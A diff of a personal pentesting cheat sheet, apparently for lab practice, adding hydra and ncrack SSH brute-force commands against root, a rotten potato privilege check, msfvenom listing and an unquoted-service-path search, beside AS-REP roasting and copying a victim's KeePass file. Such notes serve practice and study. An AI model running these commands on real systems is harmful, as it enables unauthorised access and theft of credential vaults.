@@ -87,6 +87,8 @@ cd /opt/impacket/examples
 
 `python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format hashcat -outputfile hashes.forest`
 
+### bruteforce
+
 **wfuzz bruteforce http login**
 
 observe the POST request in Burp,  plug in the user and password DOM elemenets into the commmand; here the user login is defined by user_login, and the password is defined as pass
@@ -99,7 +101,16 @@ we run it first without specifying a character count to ignore, and once we see 
 
 wfuzz --hc 404 -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://10.xx.x.xxx/webmail/src/FUZZ.php
 
-###### exploitation
+** hydra bf ssh **
+
+
+`hydra -f -V -t 1 -l root -P /usr/share/wordlists/rockyou.txt -s 22 10.11.1.* ssh`
+
+** ncrack bf ssh **
+
+`ncrack -vv -p 22 --user root -P PASS_LIST 10.11.1.*`
+
+### exploitation
 
 **compile for centos on kali**
 
@@ -110,6 +121,30 @@ wfuzz --hc 404 -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://10.xx
 **compile windows exe on linux**
 
 `i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe`
+
+**rottenpotato.exe**
+
+run
+
+`whoami /priv`
+
+if SeImpersonatePrivilege is enabled, then the host is likely vulnerable to rotten potato
+
+**msfvenom**
+
+`msfvenom --list | grep windows`
+
+
+### windows post exploitation enumeration
+
+find unquoted service paths
+
+`wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """`
+
+
+**this list is a WIP**
+
+### moving files
 
 **windows file download**
 
@@ -146,4 +181,5 @@ on windows (our target/victim):
 `cd Neigh`
 
 `PS Neigh:\> cp C:\Users\victim\Documents\CEH.kdbx .`
+
 
